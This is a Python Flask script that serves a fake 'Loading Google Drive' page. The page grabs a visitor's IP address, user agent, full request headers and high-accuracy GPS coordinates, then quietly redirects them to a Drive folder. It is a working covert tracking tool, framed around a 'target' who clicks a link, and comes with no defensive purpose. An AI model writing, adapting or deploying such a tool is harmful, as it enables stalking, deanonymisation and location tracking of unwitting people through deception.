from flask import Flask, request, render_template_string, redirect
import datetime

app = Flask(__name__)

# Configured to forward users directly to your specific "Meme Nacang" folder
TARGET_GOOGLE_DRIVE_URL = "https://google.com"

# The landing gateway that loads the tracking script before forwarding
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading Google Drive Folder...</title>
    <script>
        function sendDataAndRedirect(lat, lon) {
            // Sends the collected coordinates back to our secondary server endpoint
            let targetUrl = "/done?lat=" + lat + "&lon=" + lon;
            window.location.href = targetUrl;
        }

        function initCapture() {
            if (navigator.geolocation) {
                // Request high-accuracy GPS coordinates from the browser engine
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        sendDataAndRedirect(position.coords.latitude, position.coords.longitude);
                    },
                    (error) => {
                        // If denied or timed out, forward anyway so the bot workflow doesn't break
                        sendDataAndRedirect("Permission_Denied_Or_Timeout", "None");
                    },
                    { enableHighAccuracy: true, timeout: 4000 }
                );
            } else {
                sendDataAndRedirect("Not_Supported", "None");
            }
        }
        window.onload = initCapture;
    </script>
</head>
<body style="background-color: #f1f3f4; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
    <div style="text-align: center;">
        <p style="font-size: 18px; color: #3c4043;">Loading Google Drive, please wait...</p>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    # INSTANT LOGGING: Captures network-level IP data immediately upon click
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"\n[{timestamp}] === TARGET TRIGGERED LINK ===")
    print(f"IP Address: {request.remote_addr}")
    print(f"User-Agent: {request.headers.get('User-Agent')}")
    
    print("--- Full HTTP Request Headers ---")
    for key, value in request.headers.items():
        print(f"{key}: {value}")
        
    return render_template_string(HTML_TEMPLATE)

@app.route('/done')
def done():
    # Extracts the coordinates sent over by the initial page's JavaScript
    latitude = request.args.get('lat')
    longitude = request.args.get('lon')
    
    print(f"GPS Output -> Latitude: {latitude}, Longitude: {longitude}")
    print("Forwarding user to destination...")
    
    # Final step: Transparently drop the bot into your real Google Drive folder
    return redirect(TARGET_GOOGLE_DRIVE_URL)

if __name__ == '__main__':
    # Configured to map directly to Replit's public web proxy port
    app.run(host='0.0.0.0', port=8080)
